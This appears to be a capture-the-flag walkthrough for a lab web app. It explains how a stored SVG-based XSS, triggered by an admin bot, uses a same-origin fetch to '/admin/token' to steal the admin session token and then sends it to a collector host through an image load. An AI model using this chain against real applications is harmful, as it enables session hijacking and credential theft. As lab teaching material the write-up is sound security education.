The admin bot visits any path you submit to `POST /report`, every couple of
seconds, while holding the admin `session` cookie. So report your `/u/<uuid>`
profile — the bot loads it, and the `<object>`-embedded SVG runs **in the app's
origin, in the admin's browser**.

Now, what does a script in the app origin get you? There is an admin-only
endpoint, `GET /admin/token`, that returns the 32-hex admin session — but only to
a request that carries the admin cookie. You can't send that request; the admin's
browser can. A **same-origin** `fetch('/admin/token')` from inside your SVG makes
the browser attach the admin cookie automatically:

```js
fetch('/admin/token')
  .then((r) => r.text())
  .then((t) => {
    /* you now have the token */
  });
```

(You don't even need `document.cookie` — the browser sends the cookie for you,
which is why this would work even if the cookie were `HttpOnly`.)

Last step: get `t` out to somewhere you can read. The only listener reachable
from the bot's network is the collector at `http://collector:9000/` (that network
has no internet route). How do you make a browser fire an HTTP GET to another
host from a script without worrying about CORS? An image load —
`new Image().src = '…'` — does exactly that.
